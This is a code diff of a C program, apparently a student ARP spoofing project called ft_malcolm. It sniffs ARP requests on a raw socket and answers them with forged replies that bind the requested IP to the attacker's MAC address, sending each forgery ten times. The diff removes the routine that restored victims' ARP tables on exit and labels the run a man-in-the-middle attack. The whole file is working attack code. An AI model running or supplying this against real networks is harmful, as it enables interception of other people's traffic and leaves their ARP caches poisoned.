@@ -1,5 +1,5 @@
 #include "ft_malcolm.h"
-#include <pthread.h>
+
 //#define BUFFER_SIZE 1514
 
 char ip_address[16];
@@ -137,34 +137,14 @@ void    verbose_print()
                    all.response.ethhdr.ether_dhost[2], all.response.ethhdr.ether_dhost[3],
                    all.response.ethhdr.ether_dhost[4], all.response.ethhdr.ether_dhost[5]);
 
-    printf("eth src address: %02x:%02x:%02x:%02x:%02x:%02x\n",
+    printf("eth src address: %02x:%02x:%02x:%02x:%02x:%02x\n\n",
                    all.response.ethhdr.ether_shost[0], all.response.ethhdr.ether_shost[1],
                    all.response.ethhdr.ether_shost[2], all.response.ethhdr.ether_shost[3],
                    all.response.ethhdr.ether_shost[4], all.response.ethhdr.ether_shost[5]);
     return ;
 }
 
-// void *my_thread_function(void *arg) {
-    
-//     char buffer[BUFFER_SIZE];
-//     struct in_addr src_ip_rec, dest_ip_rec;
-//     t_arp_packet_receive receive;
-//     while (1){
-//         recvfrom(all.sockfd, buffer, ETH_FRAME_LEN, 0, (struct sockaddr*)&all.saddr, (socklen_t*)sizeof(all.saddr));
-//         receive.ethhdr = (struct ether_header *) buffer;
-//         receive.arphdr = (t_arphdr *) (buffer + sizeof(struct ether_header));
-//         ft_memcpy(&src_ip_rec.s_addr, receive.arphdr->ar_spa, sizeof(src_ip_rec.s_addr));
-//             ft_memcpy(&dest_ip_rec.s_addr, receive.arphdr->ar_tpa, sizeof(src_ip_rec.s_addr));
-//             if (all.ip_address_source == receive.arphdr->ar_spa ){
-                
-//                 printf("\nWaiting arp request to spoof again...\n\n");
-                
-//             } 
-            
-//     }    // Thread code goes here
-// }
-
-void    request_reply(char *ip_source, char *mac_source, char *ip_target, char *mac_target)
+void    request_reply(char *ip_source, char *mac_source, char *ip_target, char *mac_target, struct in_addr dest_ip_rec)
 {
     int if_index;
 
@@ -177,7 +157,7 @@ void    request_reply(char *ip_source, char *mac_source, char *ip_target, char *
     all.response.arphdr.ar_pln = 4;
     all.response.arphdr.ar_op = htons(2);
     ft_memcpy(all.response.arphdr.ar_sha, all.mac_address_source, ETH_ALEN);
-    ft_memcpy(all.response.arphdr.ar_spa, all.ip_address_source, 4);
+    ft_memcpy(all.response.arphdr.ar_spa, &dest_ip_rec, 4);
     ft_memcpy(all.response.arphdr.ar_tpa, all.ip_address_target, 4);
     ft_memcpy(all.response.arphdr.ar_tha, all.mac_address_target, ETH_ALEN);
     ft_memcpy(all.response.ethhdr.ether_dhost, all.mac_address_target, ETH_ALEN);
@@ -193,85 +173,79 @@ void    request_reply(char *ip_source, char *mac_source, char *ip_target, char *
     all.response.ethhdr.ether_type = htons(ETH_P_ARP);
     if (all.verbose == 1)
         verbose_print(all.saddr);
-    int i = 0;
-    
+    int i = 1;
     while (i < 10)
     {    
         if (sendto(all.sockfd, &all.response, sizeof(t_arp_packet_response), 0, (struct sockaddr *) &all.saddr, sizeof(all.saddr)) < 0) {
             perror("Erreur lors de l'envoi de la requête ARP");
             exit(EXIT_FAILURE);
         }
-        
-        // if (i == 0)
-        // {
-        //     pthread_t my_thread;
-        //     int thread_creation_status = pthread_create(&my_thread, NULL, my_thread_function, NULL);
-        //     if (thread_creation_status != 0);
-        // }
         sleep(1);
+        if (i % 3 == 0)
+            printf(".\n");
+        else   
+            printf(".");
         i++;
     }
-    //pthread_exit(NULL);
-    return ;
-}
-
-void    restitution()
-{
-    int if_index;
-    char buffer[BUFFER_SIZE];
-    struct in_addr src_ip_rec, dest_ip_rec;
-    unsigned char mac_address_rest[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    t_arp_packet_receive receive;
-    all.response.arphdr.ar_hrd = htons(ARPHRD_ETHER);
-    all.response.arphdr.ar_pro = htons(ETH_P_IP);
-    all.response.arphdr.ar_hln = 6;
-    all.response.arphdr.ar_pln = 4;
-    all.response.arphdr.ar_op = htons(1);
-    ft_memcpy(all.response.arphdr.ar_sha, all.mac_address_target, ETH_ALEN);
-    ft_memcpy(all.response.arphdr.ar_spa, all.ip_address_target, 4);
-    ft_memcpy(all.response.arphdr.ar_tpa, all.ip_address_source, 4);
-    ft_memcpy(all.response.arphdr.ar_tha, mac_address_rest, ETH_ALEN);
-    ft_memcpy(all.response.ethhdr.ether_dhost, mac_address_rest, ETH_ALEN);
-    ft_memcpy(all.response.ethhdr.ether_shost, all.mac_address_target, ETH_ALEN);
-    ft_memcpy(all.saddr.sll_addr, mac_address_rest, ETH_ALEN);
-    if_index = if_nametoindex("enp0s1");
-    all.saddr.sll_family = AF_PACKET;
-    all.saddr.sll_ifindex = if_index;
-    all.saddr.sll_protocol = htons(ETH_P_ARP);
-    all.saddr.sll_pkttype = PACKET_OTHERHOST;
-    all.saddr.sll_hatype = ARPHRD_ETHER;
-    all.saddr.sll_halen = ETH_ALEN;
-    all.response.ethhdr.ether_type = htons(ETH_P_ARP);
-    if (all.verbose == 1)
-        verbose_print(all.saddr);
-    if (sendto(all.sockfd, &all.response, sizeof(t_arp_packet_response), 0, (struct sockaddr *) &all.saddr, sizeof(all.saddr)) < 0) {
-        perror("Erreur lors de l'envoi de la requête ARP");
-        exit(EXIT_FAILURE);
-    }        
+    printf("\nSpoofing done !\n");
     return ;
 }
 
 void    inthandler()
 {
-    printf("\nARP table restoration...\n");
-    restitution();
-    printf("End\n");
+    printf("\nEnd of the man in the middle attack ...\n");
     close(all.sockfd);
     exit(0);
 }
 
+void    exit_msg(char *str)
+{
+    printf("%s\n", str);
+    exit(1);
+}
+
+int		ft_strncmp(const char *s1, const char *s2, size_t n)
+{
+	if (n <= 0)
+		return (0);
+	while (n > 1 && (*s1 != '\0' && *s2 != '\0') && *s1 == *s2)
+	{
+		s1++;
+		s2++;
+		n--;
+	}
+	return ((unsigned char)*s1 - (unsigned char)*s2);
+}
+
+int		ft_strlen(char *s)
+{
+	int i;
+
+	i = 0;
+	while (s[i] != '\0')
+	{
+		i++;
+	}
+	return (i);
+}
+
 int main(int argc, char **argv) 
 {
-    // if (getuid() != 0)
-    // {
-    //     printf("Usage: <%s> Please run as root\n", argv[0]);
-    //     return 1;
-    // }
-    // if (argc != 5)
-    // {
-    //     printf("Usage: <%s> [source ip] [source mac address] [target ip] [target mac address]\n", argv[0]);
-    //     return 1;
-    // }
+    if (getuid() != 0)
+        exit_msg("Usage: sudo <ft_malcolm> [source ip] [source mac address] [target ip] [target mac address] option : (-v)");
+    all.verbose = 0;
+    if (argc != 5 )
+    {
+        if (argc == 6)
+        {
+            if (ft_strncmp((argv[5]), "-v", ft_strlen("-v")) == 0 && ft_strlen(argv[5]) == ft_strlen("-v"))
+                all.verbose = 1;
+            else 
+                exit_msg("Usage: sudo <ft_malcolm> [source ip] [source mac address] [target ip] [target mac address] option : (-v)");
+        }
+        else
+            exit_msg("Usage: sudo <ft_malcolm> [source ip] [source mac address] [target ip] [target mac address] option : (-v)");
+    }
     signal(SIGINT, inthandler);
     char buffer[BUFFER_SIZE];
     ssize_t recv_len;
@@ -279,7 +253,7 @@ int main(int argc, char **argv)
     struct in_addr src_ip_rec, dest_ip_rec;
     const char *ifname = "enp0s1";
     unsigned char mac_address_source[ETH_ALEN];
-    all.verbose = 1;
+    
 
     all.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if(all.sockfd < 0) {
@@ -297,7 +271,8 @@ int main(int argc, char **argv)
             ft_memcpy(&src_ip_rec.s_addr, receive.arphdr->ar_spa, sizeof(src_ip_rec.s_addr));
             ft_memcpy(&dest_ip_rec.s_addr, receive.arphdr->ar_tpa, sizeof(src_ip_rec.s_addr));
             if (inet_addr(argv[3]) == src_ip_rec.s_addr ){
-                request_reply(argv[1], argv[2], argv[3], argv[4]);
+                printf("Spoofing in progress\n\n");
+                request_reply(argv[1], argv[2], argv[3], argv[4], dest_ip_rec);
                 printf("\nWaiting arp request to spoof again...\n\n");
                 //break;
             }
